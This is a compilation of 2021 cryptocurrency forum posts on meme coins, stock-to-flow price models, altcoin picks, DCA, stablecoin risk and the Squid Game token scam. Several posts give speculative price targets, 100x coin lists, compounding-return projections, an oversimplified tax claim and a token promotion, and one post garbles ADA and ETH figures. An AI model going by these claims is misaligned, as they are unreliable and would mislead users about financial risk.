5. I wish I had a stablecoin reserve so that I could quickly buy coins when things suddenly dipped hard.

These are just some of the thing that I wish I did better. Yes I could of made alot jumping on the meme coin train but honestly I like to keep my risk medium to low and investing in Doge and Shiba is at best gambling imo which is why I never jumped on the train.

Just my 2 cents on missing out on shib and doge because I know lost of people including me are on copium right now for missing those rockets.

The whole reason I signed up on kraken is because they offered this certain coin and I wanted it due to its connection with gamestop and shenanigans involving them and some hedge funds that need to be liquidated. Why the hell is it restricted? Is it restricted on any other platforms? I want juicy tendies damnit and I keep being denied my tendies. I have no idea if I made it to the end of the ridiculous character count they require for posts on this subreddit. If you have read this far thank you for your time and effort thus far.

Which coin did you invest in that didnt die out but instead went sideways on your for a very long time? LTC was my most memorable sideways coin i had invested in. I fell victim to it again in 2018 when i bought around ATH and then suffered with my poor decision for months until i was finally able to just accept the loss and move on with other projects and coins. I still have love for the coin and hope that someday in the future it returns to its former glory, but right now i can not see my self throwing anymore money at it. Not blaming anyone, sometimes things do not always work out for you. Which coin or project was the one that let you down the most?

The 'Stock-to-flow' is a number that shows how many years, at the current production rate, are required to achieve the current stock. The higher the number, the higher the price. The stock-to-flow model is generally applied to natural resources such as gold or silver, often referred to as store of value resources that, in theory, should retain their value over the long term due to their scarcity and low flow. The idea is that low supply makes the metals more like hard money  contrasted with the dollar. This is an especially harsh juxtaposition as the Federal Reserve has printed more than $4 trillion in fresh dollars since the coronavirus pandemic hit in March 2020; thats the same amount the U.S. central bank had previously created since it was established early in the last century. Its worth noting the model relies heavily on the assumption that the scarcity of the cryptocurrency should drive value, which might not always be the case.

With the model first being released with the price of bitcoin around $3,000, the price of bitcoin impressively oscillated around the model over the past two years. Over the past few months as the price has retraced 50% from Aprils highs, the deviation from the model value widened to historic levels. It was dangerously close to being invalidated but thanks to the recent rally back to new all time highs, were still in the game.

The bitcoin stock-to-flow model currently suggests the price of bitcoin should be around $94,476. As of writing, BTC is trading around $61,000. Bitcoins price could add 60% of value in the next 30 days to close just shy of $100,000, predicted the analyst behind the popular stock-to-flow model, PlanB. He was spot on in regards to the September BTC close price and was agonizingly close in October. He also sees BTC above $100,000 by the end of 2021, but the December target is $135,000, while the November one is at $98,000

The model predicts a Bitcoin price of $288,000 by 2024.

**Tl;dr:** Share you favorite post from this sub for others to learn from.

Like the title says, we all know that this winter will likely be wild. Outside of this post of course, what advice, or analysis, or discussion on this sub would you recommend to a friend that is new to crypto, or perhaps has lost perspective, for this upcoming period of volatility.  

I've seen a lot of thoughtful commentary on here myself, but it often tends to get lost in the shill posts and questionable news articles and press releases that fill the feed. Let's use this space to highlight the best advice or crpyto thoughts you've come across, so people can hopefully find some actual insight.   

Cheers!

The market is pretty nuts right now, Im waiting patiently for alt coin season to begin. Ive been adding to my bags through the dip and I have my favorites. Im loving ATOM for the Cosmostation wallet. The rewards are pretty high and I see strong long term potential for this project. 

Im also still holding a bit of Solana and its moving very well forward. Im curious to hear what you guys are watching. What are your favorite coins and what is it you think will give them longevity. 

Im not looking forward pump and dump nonsense. Im interested in projects with utility. And yes, DYOR, I know, I have, and I will continue to do so. But, often in market analysis, a survey of participants can be a useful tool. 

So, not looking for financial advice, just curious what the people on this thread are watching and what they like about the projects theyve picked. 

Thanks Im advance for the replys. Ill do my own research on any projects.

Since were approaching the last phase of the Bull run. As a result, you're left with coins that you hope will do well legally and have the technology to last as a crucial platform asset. And there are a few that can do just that..
Those coins are the following (for 100x):

Cardano (ADA) - target $6.4 trillion market cap - can avoid regulatory hurdles, way behind in the tech competition.

Solana (SOL) - target $6 trillion market cap - ahead in the tech game, but super centralized presently.

Polkadot (DOT) - target $4.4 trillion market cap - way ahead in addressing the problem of centralization, but wont have a fast functioning platform until late December 2021 (= way behind in the tech battle)

Terra (LUNA) - target $1.67 trillion market cap - way ahead in the tech and in having a functioning ecosystem, is only just now working to decentralize everything in the face of SEC challenges

Avalance (AVAX) - target $1.14 trillion market cap - ahead in the technology, just beginning to look at regulation

Algorand (ALGO) - $1.1 trillion market cap - ahead in the technology, slightly ahead in looking to regulation
All of those currencies have the potential to grow 100-fold in the next ten years. However, after ten years, just one or two will likely exist.
If were talking about coins to explode 2022, stretching their PUMPS TILL 2025, then you have them below..

Ethereum (ETH) - Although not currently fast, most of the world's D'apps are on it, it won't run into legal complications because it's already been ruled out as a security, and an Ethereum ETF might be released by the end of 2021. In this bull run, Ethereum's high end is likely to be $20,000. Target: 3x - 5x

Solana (SOL) - The fastest platform coin available, with a nearly complete ecosystem. They began with decentralized finance and have now expanded to include NFTs and Web 3 technology. They have a market capitalization of $62 billion, so they could generate income up to 10x.

Terra (LUNA) - a lightning-fast platform with the most comprehensive decentralized finance ecosystem on the market. It offers the best yield farming products (I wrote an entire post about how to retire on $250k using Terra) and has lately expanded into NFTs and Web 3. With a market capitalization of only $17 billion, this could quickly double.

Avalanche (AVAX) - SOL and LUNA are faster, but perhaps not quick enough. It features a rather extensive decentralized finance environment and is home to some incredible projects, such as TIME. It's difficult to understand how DOGE has a greater market cap with a market cap of only $14 billion.
Algorand (ALGO) - It's a little slower than SOL and LUNA, but it's fast enough to help El Salvador and other countries embrace Bitcoin as their national currency. In a nutshell, it has real-world applications. The tiniest of these ventures, but the most promising.

Hi everyone, 

So, my partner earns a pretty decent salary and I am currently a full time stay at home parent and am thus not working. We started investing in crypto about 8 months back and am happy to say that we are doing pretty well so far.

Anyway, my query is this - basically, my partner deposits a few hundred dollars per month into my account and we use it for investing. We are making gains and I am considering taking some profits. 

Now, from a tax perspective (in Australia), if I make profits from the money gifted to me, am I exempt from CGT taxes as long as I stay below the minimum threshold? 

Does anyone know if there are rules around spousal gifts and so on? 

If anyone can link me to a site where I could find more info on this, Id be really appreciative.

Hey all, this is my first post here and So I have recently got into the crypto side of things, currently an unemployed college student. 

My question is, for someone new what would you recommend they invest monthly to see decent gains? I was thinking of investing around $10-$15 a month on BTC and ETH or any other altcoins, I know the rule is dont put in what youre afraid to lose but I feel as if this is a good starting point for me. will I see any gains with little money each month? 

I obviously dont expect to get rich immediately (or at all) As I plan to use any profits as reinvestment fuel. Thank you!!


Edit: thank you all so much for the responses! Didnt expect to get so many responses in less than 5 minutes! I greatly appreciate all your help!

Do you leave any fiat on your fiat-Accounts? Like a safety net for unexpected spendings?
It doesnt make me any money to leave it there and i think it will do me good when putting it into crypto. Something relativ safe like btc or eth or sth. Sure, it might drop but i dont think it will be a total loss and it pains me somewhat to just leave it on the account, making no money and especially when i dont need it right now, you know what i mean?
Wont spend it on anything risky or pure speculation.
Whats your go to in that scenario?

Some of us have seen [this tweet](https://twitter.com/leesharpenfl/status/1360288214930493443?s=21) or other stories relating to the Starcraft tournament where the people in the 5th - 8th place got cheesy Bitcoin instead of cool money.

Its always fun to look back on historical events to realize how clueless the majority of us were. Besides spending way too much time playing Call of Duty, using way too much hair gel and having pants that were way too baggy, we couldve been setting ourselves up to be millionaires!

What things in crypto do you think well look back on 10 years from now and facepalm? Of course there will something about memecoins, like how far theyve come or didnt come since today.

What are some other things that will make people laugh when they look back besides your bad hairstyle?

Exit strategy this bull cycle

As we all know this bull cycle will eventually come to an end but knowing when is the biggest issue. So as for us looking to take our return investment, at what price are you willing to sell your crypto? (In USD)  
These are what In mind, but are they realistic? Looking to sell them buy back again in bear market. 

BTC: 100000
ETH: 10000
ADA: 5 
LINK:50
MATIC: 5
XRP: 5
DOT:100
VET: 1
ATOM: 70

 Got more small cap but this is my main portfolio. Not much total but its a start.

I should start by saying I am by no means even close to an expert in the field of investing etc.

That over with, people on this sub seem to be commenting the phrase 'buy the rumour, sell the news' at times where it makes absolutely no sense to say that and I think a little example and discussion would be good to have for some members because it is a good rule of thumb that is being rather abused as of late.

People seem to have confused the phrase to mean that ANY news is a sell point.

An example would be ETH 2, when it was first announced that was not 'news' that was more in the 'rumour' category, yes it was a fact that it was happening but it was a new concept that had unknown possibilities and effects on the wider market. That was the rumour from the fact that was delivered.

The 'news' part of that will be when ETH 2 officially starts and all that staked ETH gets set loose again. This is where some people seem to think that the price for ETH will go up but there is a real possibility that people/institutions will just take their gains and go else where to somewhere where the future roadmap is more laid out.

Loopring is today's hot topic second example, clearly the GME connection is easy rumour category but  a lot of people seem to understand that the official announcement, as it will be a fact, would be 'news'. As above, the rumours and unknown that will come from that announcement will fall more under rumour. The news part will be if/when GME try and sell ETFs, I certainly do NOT have the diamond balls to be a bag holder on that day no matter what the potential gains.

DOGE/SHIB are more easy examples. Memecoin popular, celebs like them, easy rumour. Coins make big gains, news headlines saying coins making the big gains, time to sell before others sell.

&amp;#x200B;

Comment your rumour/news stories below to help out the community, especially the newer members that don't have the same experience as some of us older ones.

Long time lurker / commenter, first time poster.

Has anyone else seen the new [Harmony ONE ad](https://www.youtube.com/watch?v=lYoL5mQciFA)?

I'm not here to shill Harmony, although I do love it - I do however think that we need a lot more adverts like this if we are to garner mainstream adoption. People buy things or invest in things based on how they look and how things make them feel, rather than based on sharding, transaction times, TVL etc etc. If we expect Gen Z in particular to buy into crypto, it's going to take content like this to bring them in - Apple-esque, focusing on 'creators' and clearly inclusive. Sure, it's a bit generic, but if crypto becomes part of 'generic' then we've reached mass adoption.

Brilliant news for anyone who was being priced out of the alerts by the recent price movement. You now only have to hold 3 tokens for custom signal alerts! You don't have to pay them, just hold them in your wallet. You can even stake them at the same time so they're earning money while giving access. Remember, the Aurox platform is free for everyone forever. No more crazy fees like Trading View. The 3 held tokens are only if you want to receive custom alerts.  Personally, I've staked my tokens for 3 years and I couldn't be happier. www.getaurox.com

Very few believe in crypto to the degree necessary for it to make you rich (short of complete luck meme coin mooning).

They arent going in hard enough.
$100, even if your crypto goes 100x, is not making you rich. Or you are constantly jumping from one opportunity to another, instead of committing as absolutely hard as you can to what projects you believe in.

And they will sell far too early.

When they have enough to get out of debt. When they need a down payment on a house. When they panic after a crash. When life happens.

Their day to day reality will be more real than the hope of a radically different future.

No judgment here. If crypto improves your life, its still a win. But its not what it could have been.

I first got into crypto 5 years ago, but life happened. I thought I needed the money. Knowing I could now have 100x as much money, I see that I didnt need it as much as I thought. 

But now I know, and Im back in. As financially and emotionally committed as I possibly can be. Because I refuse to find myself feeling this same way 5 years from now.

And whatever obstacles that come up, I will deal with them as if my crypto investments dont exist. Me from 5 years from now will thank me.

We all know why we are here, money. We all wanna make disgusting amounts of money while sitting and doing nothing at home. The thing is there are plenty of ways of doing that. You can sell drugs, buy stocks, buy lottery tickets and many other similarly unlikely options. 

My question is: Why didnt you choose those over crypto? What made you say: "I am never gonna make money by investing into Amazon but this crypto stuff may work for me. 

Mine was when I saw some of my friends getting insane gains  with BTC a few months ago.

What was the moment you decided if you were going to go bankrupt it was going to be with crypto?

*Do you want adoption, or disruption?*

Do you want the current banks to embrace crypto and integrate them into their centralized services, or do you want new forms of bank alternatives to emerge with more benefits for the users than never before?

Do you want a metaverse adopted by Facebook, Twitter, Apple, by taking the concept and integrating them into their servers, without any sort of community rewards while they themselves benefit the most out of it, or do you want new DAOs to form which are governed entirely by the users and the devs get enough rewards for developing the ecosystem and the user gets the deserved community points?

Do you want governments accepting Bitcoin and others as payment for taxes to be employed against your benefit, and still cutting taxes to billionaires, or do you want whole new forms of governments to gain power through DAOs to replace completely the current established system of democratic and republican altogether, along with their Super PACS and bribery?

Do you want (the current) system to adopt, or do you want (a new system) to emerge, effectively creating a revolution through a powerful technology actually capable of changing our lives?

Maybe my post is too ideal, but also, maybe a bit of idealism is needed to realize that we need to go against what is established sometimes, and not try to embrace an adoption by the current system.

**Maybe in the end we end with more adoption than disruption, but we should seek to at least balance things out: disruption enough to cause a difference in our day-to-day lives for the better, adoption enough so those of use waiting can acquire the long-wished wealth.**

The Metaverse topic is once again making headlines after Mark Zuckerberg announcing Meta, a Facebook rebranding aiming to create a virtual place where you can hang out with friends and more. 

A large number of people are already investing in anything related to virtual worlds, like buying NFTs for houses, land, cars, literally anything to be on board before metaverse takes over.

I personally think that the Metaverse wont look like what Mark and Facebook were advertising, but it will be similar to what MATIC has been building for the past 4 years, through projects like Evolution Land, Dvision Network, Aavegotchi, Realm on the Polygon ecosystem.

Or through Decentral Games that develops 3D metaverse games on blockchain for both consumer and business markets. 

Even Atari launched Decentraland where you can buy and sell LAND, Estates, Avatar wearables and names. 

My whole point is that Mark Zuckerberg gave a much needed exposure to the Metaverse, but the virtual world will be decentralized and on Blockchain.

Yes I'm aware of the volatility of Crypto and I've been DCA'ing for quite some time now.  
I witnessed many crashes/dips and I didn't sold my coins, quite the opposite I bought the dips If I had enough money left.  


People say don't invest more than you can afford to lose but since I'm born I just witnessed the prices for good increase while FIAT continued to devalue. I was constantly in a loss owning FIAT.   
Also FIAT was much easier to spend and I spend it for dumb stuff.  


With Crypto I was finally able to store and accumulate wealth.   
I'm personally not into coins which skyrocket within a short period of time, I prefer it slow and steady (also because of Taxes in my country).  
Of course I bought a ledger to keep my funds secure and I'm quite optimistic for my future since I own Crypto.  


Right now I don't see a better asset with a brighter future than Crypto and I have no regrets to have invested the majority of my money into it.  
I will continue to build up my Crypto portfolio, no matter how many times it will crash/dip.  
The only scenario where I sell my Coins is if I'm able to fulfill my goal with Crypto or there is a major technical exploit which can't be fixed.

I was once there and I feel like most of us have. So happy and excited about the bull run then out of nowhere dip
And its so frustrating cause we usually never think about keeping stablecoins on the side. I learned from that eventually and started keeping a sizable amount of stablecoins in my wallet. 

A crypto compatible credit card would definitely help me out with that since that way I can cash my entire salary in stablecoins and use them to pay for my everyday appliances at the same time. 

I dont have access to Coinbase credit cards in my country however CoinOvy might be accepted here when they launch soon. So I might just replace that with apple pay and my bank card.

Did y'all miss this? I haven't seen a post about this so far but DOT currently sits at $49.81 and recently hit its new ath of $49.91. I didn't expect it to fly under the radar to be honest.

It's pretty well known that DOT has been trading sideways for a while now, ever since the bear market dip earlier this year but maybe this is polkadot's time to shine and finally have its explosive upside trend. 

I want to congratulate everyone who held onto their DOT and everyone who bought it when it dipped all the way down to $12 during the bear market.

I bought, with two separate transactions,  200 and 150 dollars of USDC. Now, the funds are normally put right into my account for immediate use, and the funds were removed from my bank account. The purchases did not show up in my coinbase account, nor are there pending transactions in my history. I've tried getting some help through coinbase but their customer service is trash. Anyone else have this issue that could point me in the right direction? I was thinking of calling my bank to try and cancel the transaction. Thanks for the help!

I seem to be coming up with more and more reasons not to have crypto apps on my phone. Aside from the obvious benefits mentally of not checking your portfolio every hour (ok, every 5 minutes), I was walking home after work quite late. I decided to quickly check my apps and just realised - whats to stop someone from robbing me of all my crypto right now? I have all the apps where my crypto is stored and they can force me to authorise transactions to their account. Of course this would take some time and would likely get noticed - but the damage could already be done by then. 

What do you think? Do you agree that it seems quite risky when you step back and think about it, or is there something I'm missing?

Well that was quite the exciting time! With altcoin season just around the corner, many of us started stacking our alts in hopes of predicting which ones will have the best gains. 

I think Im finally comfortable with my stacks. Its very relieving to be rid of the FOMO and I can once again re-shift my investments to stackin SATs and ETH. 

Are you at that comfortable stage with your stacks? Or are you still fearing that youre missing out? Heres a tip: unless you have a detailed plan that outlines how much to put into alts, you will always have the FOMO. 

Set your goals. Hit them. Go back to stacking the blue chips. Its a nice feeling.

So Polkadot just broke its ATH and smashed through 50 dollars just days before the parachain auctions. Huge congrats to any other fellow DOT holders, I feel like we could see DOT become a top 3 coin at some point in the future! I wonder where the price will go from here and lets hope we can stay on this green ride all the way up to the auctions!

Reason why the Meme tokens are making 10X now isn't because they are great projects or have useful tokenomics etc.

Its because the people who don't even have any interest in investing are being forced to invest to live a decent life. 

Life is getting a lot pricier than it was years before which was a lot pricier comparing to years before them. That, if you're living in a GDP top 15-30 country, you have no choice of Investing your money to live a respectable life.

The real bill of the pandemic started to hurt many countries, even some developed ones, and once a massive populace enters investing stage of course theill pick what they can understand.

Like sure, some of them will probably read the whole white paper of ETH and say ***"Wow, this is a technology that will change the world and a great investment! I should invest and stake my savings for a better future!"*** But I'm not sure if average Joe will really gonna do that.

So you invested in squid (or a scam) and got rug pulled? Or maybe that 100 000 x coin didn't pan out for you? 

The experience can be painful - but that's okay. We've now learned a hard lesson. 

Let's take a breather. And look into ideas to get you back on your feet. 

.... 

Here's a summary of what this sub has been advocating for a long term:

1) DYOR: do you own research. Read about the coin, its utility, market cap, potencial for being a scam

2) DCA: dollar cost average. Invest a small amount regularly (once a day/week/month etc). Over time this has shown to be a proven strategy. Over time you'll learn how to refine this to suit you

3) HODL: stick to your strategy and hold on to your coins (esp BTC, ETH and other proven coins)


Here's ideas where to invest :

1) BTC / ETH : good start to get your feet wet

2) top 20 coins with promising future (pick your favourite) : ALGO, SOL, MATIC, DOT, ADA, XTZ, etc

3) keep a small portion (5 - 10%) for FOMO: 

stick it in a (well known) meme coin of your own chopsing (DOGE, SHIBA, etc). The idea is you never know what will make money, but if you were to lose it all - at least its only a small % of your portfolio. If it were to moon like Shiba did, well then you'll feel smug about yourself. 

And that's it. I'm sorry to all those who lost money in rug pulls or coins that crashed. 

I wish you Sucess for the future though. 



^(as always, DYOR,  This comment serves to provide opinion and does not constitute financial advice. I have nothing against meme coins, but I do not personally have any meme holdings at this stage. )

Dear friends,

First of all, let me say that I absolutely do not wish the scenario I'm about to lay down comes true. I firmly believe that cryptocurrencies will fundamentally change the way we interact with money, attribute value to physical and digital assets, and how we interact with the internet (Web3 is a fascinating usecase, in my opinion). I never took profits since I started investing in crypto  some will say that's dumb, some will say that's wise, but I will say that it shows how committed I am. 

So before you hit that downvote button : I am not trying to spread FUD with this post. 

But I think that a lot of people around here don't actually understands how our beloved cryptos could potentially suffers a catastrophic collapse. Let's be real : the lack of clearly defined rules has allowed lots of very solid projects to come to fruition, but it also created a fragile equilibrium in our ecosystem. If something bad happens, absolutely nobody could help us. 

**What is the danger?** 

In one word : stablecoins. 

Yes, I know they are supposed to be the safest way to hold crypto. After all, they are backed 1:1 with the USD, so there is no risks... right? 

Wrong. Because there is almost no rules on who issues those stablecoins, they are not as solid as some may think they are. Most of you probably heard about Tether, the Hong Kong-based company that issues the stablecoin bearing it's name. They do not hold cash equivalent to the circulating supply of Tethers  what they have is some portions of cash, bonds and commercial papers debts. 

This is a big problem.

**How could a crisis happen?** 

Imagine if ETH pumped to 10k in a matter of a few weeks, and that lots of people want to cash out by swapping ETH for Tether, and then swap Tether for real USD. Tether, the company, would need to sell some of it's commercial papers to cover. But what they hold is *Chinese* commercial papers. Uh-oh. Ever heard of Evergrande? Imagine if Tether needs to cash out this (now) worthless debt from Evergrande. Woopsies. As soon as the news hits, everyone would try to cash out their Tether, exacerbating the crisis. This is what we call a bank run. 

Tether drills in value, which brings other stablecoins (USDC, Dai) down with it. Liquidity dries up. DeFi projects starts failing. And the prices of all crypto starts falling like we are in October 1929. 

In the TradFi world, there is a central bank that can bail out the defaulting banks (like they did in 2009). I am not saying it's a good or bad thing : but this intervention is possible. In crypto, there is no central bank to rescue us.     
    
**What should we do?** 

Individually, not much besides investing in the most secure and solid projects (no, Shib and Dogelon are not secure and solid projects). Some could short the market, but it's a very, very risky play. 

No, I think the answer will be collective. We need to argue in favor of regulation of stablecoins. I know, I know, we don't like regulation around here. And I get it! I provide liquidity on many pairs right now; it's not something that would have been possible with TradFi, or if the sector was heavuly regulated. 

But this total lack of regulations is a double-edged sword. It helps drive the prices up now, but it could also be our downfall. 

So, yeah. I think we need to be more open about potentially requiring, for example, that stablecoins issuers back their coins with actual, real USD. 

Am I alone in this position? What do you think about regulating stables?

Since today only the squid game token is mentioned here, I have read a few articles about it. Sadly, people have lost money, but it was their decision to invest into it. I thought that after such an obvious fraud, they would learn a lesson and be more careful. Right now I was watching what's new on Facebook and I noticed ... wait for it ... ad for baby squid token. 

Just out of curiosity, I contacted a few people from comments section and asked what they thought about it. Some of them really think that the project has a bright future despite what happened today. So ye here we go again.

So in the end of 2017, everyone was talking up Bitcoin, including the multi-billion dollar retailer I work for.  At our year-end meeting, we had about a 20 minute piece on bitcoin and whether or not it made sense for us as a corporation to look into accepting crypto for payment in the future.  Of course, a few weeks later, the great 2018 bear started and crushed corporate interest in crypto for the next 3 years.

Now then, we still have no made crypto acceptable in our company.  We are very conservative in adopting new tech, likely because we are insanely profitable, even in spite of our garbage outdated tech.  

**However** One of our major competitors announced earlier this year that they would start accepting several types of crypto in multiple test stores throughout the chain.  And word is, to keep up with the Joneses, we will be doing the same in short order.

I would not be shocked that if another massive crypto winter comes, it sets adoption back by most chains.  But regardless, crypto is continuing on its path, even in spite of its many fits and starts.  The Future is now old man, and I for one am glad to be a part of it.

By far the best coin of the last 24h has been ... **LRC**. 

And this for the simple reason: They have great technology on top of ETH as well as a use case for every day 'Toms' to use it, without even knowing. 

If the rumours are also true about the Gamestop cooperation (Which some personal employments by Gamestop from the Loopring team might hint to), this will be one of the most used Coins in the very near future. 

For those who don't know: The main technology are zero knowledge Rollups, that allow Loopring to create and transfer NFTs to a fraction of the cost of ETH, with the same security.

Example use cases: 

* Reselling used digital Games
* Trading of unique in game content
* Stock Exchange on ETH (And not fu\*king NYSE)

Nice side effect: Many investors come from gamestop subreddit, means we don't have a exit strategy, we only know buying. 

Tbh. I'm so happy to see LRC pump after all that Doge and Shiba drama. Finally Cryptos seem to be about the content again, and not the hype. And even if you won't buy LRC, you should be happy as well, to get the discussion and focus back on the technology.

Brave just posted the new user numbers for the month of October 2021.
And they look great!
- 42.1M monthly active users in total, an up of 8.2%
- 14M daily active users in total, which yield an increase of 4.5%

Those numbers are really good, what other project has a steady increase of around 7% per month!

The registered Brave Creators are steadily rising as well, with YouTube leading the pack with over 676k creators. Reddit shows 100k registered creators.

The total amount of BAT wallets is currently 7.8M!

Brave bought a total of 3.2M BAT on the open market, Coinbase mostly, which is ended up being 2.3M $!

Those numbers are really bullish for BAT, and the late price action proofs it!

I believe that many of you can join "my club".  

**My FOMO is not fear of missing out because I didn't buy that or that coin.**

**My FOMO is strongest** when I make good gains and think about taking some profits. That is why I never sell a full bag, but even then it is still scary you know.

There is nothing worse then selling something that you **holded for so long** and then watching the price jump. If I ever get PTSD from crypto this will be the reason.

If I could get a $ for every time I bought the coin at a higher price then I sold it, I would have at least 1000$ in my pocket now.

Those were begginer mistakes. 

Now I DCA in, DCA out, hold and stake. That is the only thing I am good at. Cheers!

Did you know you pay capital gains tax every time you transfer your cryptos to another coin?

If you think its a good idea to transfer some of your ETH to BTC cuz its had a good run, youre probably wrong.  Heres why

Youre going to incur a 15% capital gains tax (or more!) on that transfer just like you would if you sold that crypto for dirty fiat.  Better to just hold what you have and spend fiat to get the other crypto.

So what can you do?  Nothing.  The best you can do is know that every transfer is taxed so think hard before you invest because youre stuck with that coin unless you dont mind paying 15% to the tax man.  

Of course, this tax is only incurred on the gains you madeso its probably not relevant to most of us.

Hi, does anyone know what app, if any I could use to report on a particular crypto's new ATH? I am tired of monitoring my crypto every day. I think I would much rather just set an alert on my phone somehow to alert me when a given crypto hits a new ATH. These after all are the only times that are interesting to most of us. It would also free me up from obsessively checking - and hopefully the mood swings that come with the small (and sometimes not so small) percentage swings in either direction. Apparently I need to flesh out my post to 500 characters before I can post it? 

Anyway if you guys can recommend a particular app, I would very much appreciate it.

TLDR: Basically even just finding a way to save and invest $10 a day in crypto can become millions of dollars 10-20 years down the road even with a modest return rate. 

&amp;#x200B;

I see a lot of people on here say they can't afford much or buy much crypto so then end up feeling discouraged or, much worse, trying to hit lottery ticket memecoins. If you just DCA a little every week or month then you can make enormous amounts over time. 

Let me prove it to you: The average person ( in America) spends about $10 a day eating out and about $6 a day on coffee. If you even just took those numbers and decide to eat out half as much and make coffee at home, you would save about $10 per day or about $300 per month. 

Now if you put just that extra $300 a month into crypto every month it can grow enormously. If you just average 1% gains per month that will become $69,000 in 10 years (which is amazing for multiple reasons). If you keep averaging 1% gains per month for 20 years it will be $297,000 and at the end of 30 years it will be $1,050,000. Yeas that is over a million dollars. 

If you are like me, you are probably expecting pretty decent returns compared to the equities markets because this crypto asset class is still so young with so much potential. 

If you invest $300 a month at 2% return per month it will be $146k after 10 years, $1.7M after 20 years, and $18.7M after 30 years. If you were to even get a 3% per month return it would be $337k after 10 years, $12.0M after 20 years, and $418.2M after 30 years. 

So even if you can find a way to spare $5 a day or $10 a day to buy good crypto projects with then you are setting yourself up for millions of dollars down the road. Even a lit bit over a long time can make you rich and financially independent. 

DCA and HODL people. It can really really work.

So, after the scam that was Squidgame (and sorry for yet another thread, but I found this interesting), BSC has added another tag, Heist. 

They label this as 'Where a notable amount of Ethers or tokens have been stolen.'

So far, Squidgame is the only coin or contract with this label.

https://bscscan.com/token/0x87230146E138d3F296a9a77e497A2A83012e9Bc5

As a bonus, here are people that dropped up to half a million on Squid before it went south.

https://i.redd.it/pacimiptj1x71.jpg

Heist is a very polite tag for the dammers that are the developers, but I guess billions can make anyone sleep easy at night

I wonder what will be the next 'Heist' that will get listed. Any guesses?

Around May this year, I was looking for a fresh memecoin to place a bet on after SHIB and DOGE had their runs, so I found Catecoin.  
  It was meant to be a quick in and out within a week, but little did I know that 6 months later I'd still be holding it...  
  
  It crashed so fast and so hard after I bought it, that I didn't care enough to cash out any more, so I let it ride. Sometimes I'd take a look at it and roll my eyes, the lowest I saw it had me at a 99% loss (although the all-time low according to coingecko was even less than that).  
  
  Lo and behold I am at around 30% unrealised profit today, my fingers are itching to sell, but I think I'll hold a while longer.  
  
  Why? Because, surprisingly the devs carried on working on the project even through the insane lows.  
  Don't get me wrong though, the project itself is nothing special, and the price action is likely due to the meme coin hype, but at least it's proved itself to not be a rugpull.  
  
  Hope you enjoyed my shill, and I'd like to hear if you've had similar "investments" this year.

They also noted that winners would need to have a wallet that can receive NFTs. According to the sweepstakes rules they are valued at $20 each, seems low to me but I'm not that into NFTs. 

What more adoption do we need than McRib NFTs??? Should we start calling the top being in on this run haha?! For real though I think this could blow up into something big with the cult following the McRib has.

What's that one thing you've been seeing or hearing about in this sub but actually don't know about? (This should have been the title though but I'm just tryna increase my character count)

Yes, so what's that one word you've been seeing but don't know shit about and you're too afraid to ask.

Here's a chance to get to know what that thing actually is. Mention it here and someone who knows will give a brief meaning of it to you 

So let's begin...

PS: Do not take any meaning or explanation here as the original meaning. As always DYOR

Hi all, long story short, there was a lot of things going on here in Iran, especially since the government decided upon a plan to "Nationalize the internet" so you can access only the sites within the country.

Naturally with such a threat i had to sell, but i had about 10$ worth of LTC left. It's been almost a month i think and gladly we still have internet.

Anyways i had decided to buy a 10$ google play gift card for my brother's birthday using that LTC, but when i tried to redeem the code i found out that google had changed it's policies. You can only redeem the code if you live where it's bought or something. I tried so many ways but i couldn't do anything, this community was very nice to me and helped me a lot with all the MOONS and everything. so i thought i might share it here, in hope that it still works actually. I bought it from cryptorefills and i have the email if needed.

Where can I learn more about crypto coding? 

Hello, I have been researching and investing in crypto since june, and now think I understand the basics such as wallets, trading, staking, nfts, basic market trends etc. 

Now I would like to get into the nitty gritty; such as the structure of dapps, understanding the code and process behind everything thst is going on, I have also seen some people making their own tokens etc on Algorand and I think I would like to have a go. 

Where can I go to learn this stuff? Are there any good platforms or do I just need to learn to code and then I will understand? 

I would love any suggestions, hope you have a good day :-) 

TLDR ; where do I learn about crypto in detail and the coding side of it?

A rephrased post:

Let us just take a moment in time and appreciate what a fantastic year ADA has had. It is easy to lose sight, especially with all of the crazy shitcoins that are pumping and dumping lately and the Scams such as Squidcoin that is  taking up most of the headlines, but let us not forget that this time last year Eth was $0.09!!! And now 1 year on we sit at around $2!! (+2,000% ) Let that sink in all you so called Cardano killers! 

Cardano has been on an absolute rocket ship for most of this year and with Hydra just around the corner 2022 could be even bigger! This just goes to show investing in legitimate projects long term is almost always the best way to go. 

Cardano killers be warned   the new girl is not stopping anytime soon!

Now that the Metaverse topic is hyped up, more and more people get introduced in the cryptoverse and vice versa.

People who were not aware of crypto, but are spending their time on social media like F***book will have heard about metaverse which will undoubtful rely on crypto.

We all saw the hype about NFTs (which is still going on and there's no signs of it stopping) and now there will be 100% a gold rush for the metaverse.

Which ever platform or what coin will be number 1 has yet to show, but one thing is certain:

Crypto is a big step closer to real mass adoption with the Metaverse.

I keep on seeing this around here recently; its not funny or cute. It confuses noobs - theres enough to learn for sure when getting into this crazy market as it is, without throwing around terms like stablecoin about coins or projects that are FAR from stable when it comes to price, let alone actually have stablecoin tokenomics!

Please **STOP** calling anything thats not done +10% in the last day a stablecoin - you are making yourself look foolish or maybe dont actually understand what the terms means so maybe this will help:

**DEFINITION**

A stablecoin is a digital currency that is pegged to a stable reserve asset like the U.S. dollar.

Stablecoins bridge the worlds of cryptocurrency and everyday fiat currency because their prices are pegged to a reserve asset. This dramatically reduces volatility compared to something like Bitcoin and results in a form of digital money that is better suited to everything from day-to-day commerce or trading on exchanges. 

**FINAL THOUGHTS**

USDT (Tether) is very popular, although surrounded by controversy in huge questions around it actually being backed 1:1. I hold this in relatively small amounts as its a popular trading asset.

My longer-term holdings are all in DAI, USDC and on Binance BUSD - these are the stablecoins I personally feel happier with from a credibility point of view over Tether.

Thank you for not bailing on cryptocurrency and holding your ground during the race to the bottom. Without you foot soldiers we can only speculate where the floor would have been, and how long it would have taken for the likes of ETH to reach its new ATH! 

You are the true champs who have held your nerve and as such you are the real heroes of this cryptocurrency jungle. You continued to hold your nerve whilst others bailed and took loses. Well, if anyone should reap these rewards today, then it you! 

Hopefully in years to come when we have an economic world not controlled by institutions and governments, where we are not judged if we can purchase X Y or Z asset because or a very historic credit rating - where we are in a decentralised financial world... we will look back on moments like this and thank people like you!

I think we intuitively understand that crypto can be a tool for peaceful disobedience against tyrants who seek to control society by cutting/limiting the right to digital finance. In line with that notion - I'd like to consider the concept of disobedience more broadly, specifically to answer: how and when?

